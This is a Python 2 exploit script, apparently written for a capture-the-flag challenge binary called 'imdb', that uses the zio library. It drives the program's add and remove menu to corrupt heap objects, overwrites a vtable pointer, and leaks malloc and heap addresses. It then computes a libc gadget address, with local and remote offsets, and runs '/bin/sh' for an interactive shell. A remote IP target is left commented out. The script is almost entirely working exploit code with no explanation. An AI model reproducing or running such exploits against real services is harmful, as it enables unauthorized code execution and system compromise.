from zio import *
 
#target = ('119.254.101.197',10003)
target = './imdb'
 
def add_tv(io, name, session, rating, introduction):
    io.read_until('?')
    io.writeline('1')
    io.read_until('?')
    io.writeline(name)
    io.read_until('?')
    io.writeline(str(session))
    io.read_until('?')
    io.writeline(str(rating))
    io.read_until('?')
    io.writeline(introduction)
 
def add_movie(io, name, actors, rating, introduction):
    io.read_until('?')
    io.writeline('2')
    io.read_until('?')
    io.writeline(name)
    io.read_until('?')
    io.writeline(actors)
    io.read_until('?')
    io.writeline(str(rating))
    io.read_until('?')
    io.writeline(introduction)
 
def remove_entry(io, name):
    io.read_until('?')
    io.writeline('3')
    io.read_until('?')
    io.writeline(name)
 
def show_all(io):
    io.read_until('?')
    io.writeline('4')
    io.read_until('bbbbbbbb')
    io.read_until('actors: ')
    d = io.read_until('\n').strip('\n')
    malloc_addr = l64(d.ljust(8, '\x00'))
    print hex(malloc_addr)
 
    io.read_until('bbbbbbbb')
    io.read_until('actors: ')
    d = io.read_until('\n').strip('\n')
    heap_addr = l64(d.ljust(8, '\x00'))
    print hex(heap_addr)
 
    return malloc_addr, heap_addr
 
 
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
 
    add_tv(io, 'aaa', 100, 200, 'bbbb') #0x602010
    add_tv(io, 'aaa', 100, 200, 'bbbb') #0x6020f0
    add_tv(io, 'aaa', 100, 200, 'bbbb') #0x6021d0
 
    remove_entry(io, 'aaa')
 
    malloc_got = 0x0000000000601C58
 
    db_addr = 0x601dc0
    movie_vt = 0x00000000004015b0
 
    payload = l64(movie_vt) + 'a'*8 + '\x00'*56 + 'b'*8 +'\x00'*(0x80-8) + l64(0x0000006443480000)+l64(malloc_got)
    print len(payload)
    add_movie(io, 'ccc', payload, 300, 'eeee') #0x602010 0x602110
 
    add_tv(io, 'hhh', 100, 200, 'bbbb') #0x6021e0
    add_tv(io, 'hhh', 100, 200, 'bbbb') #0x6022c0
    add_tv(io, 'hhh', 100, 200, 'bbbb') #0x6023a0
    remove_entry(io, 'hhh')
 
    payload = l64(movie_vt) + 'a'*8 + '\x00'*56 + 'b'*8 +'\x00'*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)
    add_movie(io, 'ccc', payload, 300, 'eeee')
 
    malloc_addr, heap_addr = show_all(io)
 
    io.gdb_hint()
    add_tv(io, 'jjj', 100, 200, 'bbbb') #0x6023b0
    add_tv(io, 'jjj', 100, 200, 'bbbb') #0x602490
    add_tv(io, 'jjj', 100, 200, 'bbbb') #0x602570
    remove_entry(io, 'jjj')
 
    #local
    addr2 = malloc_addr - 0x00007FFFF7277750 + 0x00007FFFF723B52C
 
    #remote
    #addr2 = malloc_addr - 0x0000000000082750 + 0x000000000004652c
 
    fake_vt = 0x6023b0+8 - 0x602010 + heap_addr
    payload = l64(fake_vt) + '/bin/sh;' + '\x00'*56 + 'b'*8 +'\x00'*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)
    print len(payload)
    add_movie(io, l64(addr2), payload, 300, 'eeee')
 
    io.writeline('4')
    io.interact()
 
exp(target)
